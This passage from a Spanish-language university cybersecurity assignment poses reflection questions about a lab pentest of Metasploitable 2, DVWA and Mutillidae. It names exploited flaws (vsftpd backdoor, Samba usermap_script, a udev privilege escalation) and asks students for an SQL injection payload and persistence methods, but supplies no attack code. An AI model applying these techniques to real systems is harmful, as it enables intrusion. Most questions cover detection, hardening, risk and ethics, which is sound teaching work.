d\) En un escenario real, ¿cuál vector sería menos probable de encontrar
en una organización moderna? Expliquen.

e\) **Perspectiva dual:** ¿Tuvieron diferencias de opinión sobre qué
vector atacar primero? ¿Cómo llegaron a un consenso?

**BLOQUE 2: COMPRENSIÓN TÉCNICA PROFUNDA (Preguntas 4-6)**

**4. Análisis de Vulnerabilidades Críticas**

Seleccionen la vulnerabilidad más crítica que explotaron (por ejemplo,
vsftpd backdoor o Samba usermap_script):

a\) **Investigación:** ¿Cuál es el contexto histórico de esta
vulnerabilidad? ¿Cuándo fue descubierta y cómo llegó al código?

b\) **Análisis técnico:** Expliquen con sus propias palabras cómo
funciona el exploit a nivel técnico (no copien la descripción del CVE).

c\) **Remediación:** Además de actualizar el software, ¿qué controles de
seguridad adicionales podrían mitigar esta vulnerabilidad? (Mencionen al
menos 3: firewall, IDS, segmentación de red, etc.)

d\) **Detección:** Si fueran analistas de SOC, ¿qué indicadores de
compromiso (IOCs) buscarían en los logs para detectar este ataque?

e\) **División de investigación:** ¿Cómo dividieron la investigación de
esta vulnerabilidad? ¿Cada uno investigó aspectos diferentes?

**5. Escalada de Privilegios y Post-Explotación**

Reflexionen sobre la fase de post-explotación:

a\) Si obtuvieron acceso con un usuario sin privilegios, ¿qué técnicas
utilizaron para escalar a root? ¿Por qué funcionaron?

b\) Si obtuvieron acceso directo como root (por ejemplo, vía vsftpd o
Samba), ¿qué riesgos adicionales representa esto para una organización?

c\) **Investigación:** Busquen información sobre el CVE-2009-1185 (udev
privilege escalation) que afecta a Metasploitable 2. ¿Cómo funciona?
¿Por qué es relevante incluso hoy?

d\) **Persistencia:** Aunque no fue requerido en la práctica, ¿qué
técnicas usarían para mantener acceso persistente en Metasploitable 2?
Mencionen al menos 2 métodos.

e\) **Colaboración:** Durante la post-explotación, ¿trabajaron
simultáneamente en el mismo sistema o dividieron tareas? ¿Cuál enfoque
fue más efectivo?

**6. SQL Injection: Más Allá de la Explotación Básica**

Si explotaron SQL Injection en DVWA o Mutillidae:

a\) Expliquen la diferencia entre SQL Injection \"in-band\", \"blind\" y
\"out-of-band\". ¿Cuál tipo encontraron en Metasploitable 2?

b\) SQLMap automatiza el proceso, pero ¿podrían escribir manualmente un
payload de SQL Injection que extraiga la versión de la base de datos?
(Escriban el payload)

c\) **Defensa:** ¿Qué técnicas de codificación segura previenen SQL
Injection? Mencionen al menos 3 (prepared statements, ORM, validación de
entrada, etc.)

d\) **Análisis de impacto:** Además de robar datos, ¿qué otros ataques
son posibles mediante SQL Injection? (Pista: escritura de archivos,
ejecución de comandos OS, etc.)

e\) **Roles complementarios:** ¿Uno de ustedes ejecutó SQLMap mientras
el otro analizaba resultados? ¿Cómo coordinaron esta fase?

**BLOQUE 3: PERSPECTIVA DEFENSIVA Y ESTRATÉGICA (Preguntas 7-10)**

**7. Del Red Team al Blue Team**

Cambien su perspectiva de atacantes a defensores:

a\) **Detección:** Si fueran los administradores de sistemas de
TechVault Industries, ¿qué alertas o reglas de detección implementarían
para identificar los ataques que realizaron? Sean específicos (mencionen
herramientas como Snort, Suricata, SIEM, etc.)

b\) **Hardening:** Proporcionen un plan de hardening de 5 pasos para
asegurar Metasploitable 2, priorizando por impacto.

c\) **Monitoreo:** ¿Qué archivos de log deberían revisar para encontrar
evidencia de su ataque? Listen al menos 4 archivos específicos de Linux.

d\) **Ejercicio de rol:** Imaginen que uno de ustedes es Red Team y el
otro Blue Team. ¿Qué estrategias defensivas propondrían contra las
técnicas que usaron?

**8. Análisis de Riesgo Empresarial**

Adopten la perspectiva de un equipo de CISOs (Chief Information Security
Officers):

a\) **Impacto financiero:** Si Metasploitable 2 fuera un servidor real
de producción con datos de clientes, ¿cuál sería el impacto potencial de
este compromiso? Consideren: multas GDPR, pérdida de reputación, costos
de remediación, etc.

b\) **Comunicación ejecutiva:** Redacten un párrafo (3-4 líneas)
explicando el riesgo de estas vulnerabilidades a un CEO sin
conocimientos técnicos.

c\) **Priorización de remediación:** Con presupuesto limitado, ¿qué 3
vulnerabilidades remediarían primero y por qué?

d\) **Consenso de equipo:** ¿Tuvieron diferentes opiniones sobre la
priorización de riesgos? ¿Cómo llegaron a un acuerdo?

**9. Contexto Real vs. Laboratorio**

Metasploitable 2 es intencionalmente vulnerable para propósitos
educativos:

a\) **Realismo:** ¿Qué tan probable es encontrar un servidor con tantas
vulnerabilidades críticas en una organización moderna? Justifiquen su
respuesta.

b\) **Investigación:** Busquen un caso real de ataque (por ejemplo:
Equifax 2017, SolarWinds 2020, Colonial Pipeline 2021). ¿Qué similitudes
y diferencias encuentran con su ataque a Metasploitable 2?

c\) **Evolución de amenazas:** Las vulnerabilidades de Metasploitable 2
son de 2008-2012. ¿Qué tipos de vulnerabilidades son más comunes en
2024-2025? (Investiguen: supply chain attacks, cloud misconfigurations,
zero-days, etc.)

d\) **Defensa moderna:** ¿Qué tecnologías de seguridad modernas habrían
dificultado o impedido su ataque? (Mencionen: EDR, XDR, Zero Trust,
micro-segmentación, etc.)

e\) **División de investigación:** ¿Cada uno investigó un caso de ataque
real diferente? ¿Qué aprendieron al comparar sus hallazgos?

**\
**

**10. Ética, Responsabilidad Profesional y Dinámica de Equipo**

Reflexionen sobre las implicaciones éticas de las habilidades que han
desarrollado:

a\) **Línea ética:** ¿Dónde trazan la línea entre hacking ético y
actividad maliciosa? Proporcionen un ejemplo concreto de cada lado de la
línea.

b\) **Dilema ético:** Imaginen que durante un engagement autorizado de
Red Team descubren evidencia de actividad criminal (no relacionada con
su prueba) en los sistemas del cliente. ¿Qué harían? Justifiquen su
respuesta.

c\) **Responsabilidad de divulgación:** Si descubrieran una
vulnerabilidad 0-day durante esta práctica (hipotéticamente), ¿cuál
sería el proceso responsable de divulgación? Investiguen sobre
\"responsible disclosure\" vs \"full disclosure\".

d\) **Desarrollo profesional:** ¿Cómo se asegurarán de usar estas
habilidades de manera ética en su carrera profesional? ¿Qué
certificaciones o códigos de conducta seguirían? (Investiguen:
EC-Council Code of Ethics, (ISC)² Code of Ethics, SANS Ethics, etc.)

e\) **Ética de equipo:** ¿Qué harían si uno de ustedes quisiera usar
estas técnicas de manera no ética? ¿Cómo se responsabilizarían
mutuamente?

f\) **Fortalezas complementarias:** ¿Qué fortalezas únicas aportó cada
miembro del equipo? ¿Cómo se complementaron sus habilidades?

**CRITERIOS DE EVALUACIÓN DE REFLEXIONES**

  -----------------------------------------------------------------------
  CRITERIO             DESCRIPCIÓN
  -------------------- --------------------------------------------------
  Profundidad técnica  Demuestran comprensión más allá de la ejecución
                       mecánica

  Pensamiento crítico  Analizan decisiones, comparan alternativas,
                       justifican elecciones

  Investigación        Incorporan información externa, CVEs, casos reales
  adicional            

  Perspectiva          Integran visión ofensiva, defensiva y empresarial
  holística            

  Colaboración         Demuestran trabajo en equipo, complementariedad y
  efectiva             consenso

                       
  -----------------------------------------------------------------------

**RECURSOS PARA INVESTIGACIÓN**

Para responder las preguntas de investigación, consulten:

**Bases de datos de vulnerabilidades:**

-   CVE Details: <https://www.cvedetails.com>

-   NVD (National Vulnerability Database): <https://nvd.nist.gov>

-   Exploit-DB: <https://www.exploit-db.com>

**Casos de estudio de ataques reales:**

-   Krebs on Security: <https://krebsonsecurity.com>

-   CISA
    Alerts: <https://www.cisa.gov/news-events/cybersecurity-advisories>

-   MITRE ATT&CK: <https://attack.mitre.org>

**Códigos de ética profesional:**

-   (ISC)² Code of Ethics: <https://www.isc2.org/Ethics>

-   EC-Council Code of
    Ethics: <https://www.eccouncil.org/code-of-ethics/>

-   SANS Cyber Security Ethics: <https://www.sans.org/about/ethics/>

**Técnicas defensivas:**

-   OWASP Top 10: <https://owasp.org/www-project-top-ten/>

-   CIS Benchmarks: <https://www.cisecurity.org/cis-benchmarks>

-   NIST Cybersecurity Framework: <https://www.nist.gov/cyberframework>

**Trabajo en equipo en ciberseguridad:**

-   SANS: Building Effective Security Teams

-   Red Team vs Blue Team Dynamics

-   Collaborative Penetration Testing Best Practices

**REFLEXIÓN FINAL**

**\"Un pentester técnicamente competente puede explotar
vulnerabilidades. Un equipo de profesionales de ciberseguridad
excepcional comprende el contexto, anticipa consecuencias, se
complementa mutuamente y comunica riesgos efectivamente.\"**

Las preguntas anteriores están diseñadas para transformarlos de
ejecutores de técnicas en pensadores estratégicos de ciberseguridad.
Tómense el tiempo necesario para reflexionar profundamente sobre cada
una, discutir entre ustedes y llegar a conclusiones consensuadas.

**La diferencia entre dos hackers trabajando en paralelo y un equipo
profesional de Red Team no está en las herramientas que usan, sino en
cómo colaboran, se complementan y aprenden juntos de la experiencia.**

|Noviembre 2025|Elaborado por Gustavo Lara Jr.|
| :- | -: |